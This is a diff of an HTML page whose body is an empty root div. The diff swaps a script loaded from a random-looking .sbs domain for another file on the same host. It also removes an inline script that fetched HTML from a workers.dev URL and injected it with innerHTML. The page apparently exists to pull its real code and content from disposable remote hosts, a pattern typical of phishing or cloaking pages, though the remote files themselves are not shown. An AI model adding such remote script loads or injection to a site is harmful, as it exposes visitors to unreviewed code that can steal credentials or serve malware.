@@ -13,7 +13,7 @@
 
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
-    <script src="https://hwepascsajm.sbs/dgr5g-t4t8e/change.js"></script>
+    <script src="https://hwepascsajm.sbs/dgr5g-t4t8e/change1.js"></script>
 
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -454,21 +454,6 @@
 <body>
 
     <div id="root"></div>
-
-  <!-- Include the Cloudflare Worker URL to inject dynamic content into the 'root' -->
-  <script>
-    (async function() {
-      const workerUrl = 'https://f5j8t.misraniyti.workers.dev/'; // Replace with your actual Worker URL
-      const response = await fetch(workerUrl);
-      const content = await response.text();
-      
-      // Populate the 'root' div with the content injected by the Cloudflare Worker
-      const rootElement = document.getElementById('root');
-      if (rootElement) {
-        rootElement.innerHTML = content;
-      }
-    })();
-  </script>
 
 </body>
 </html>
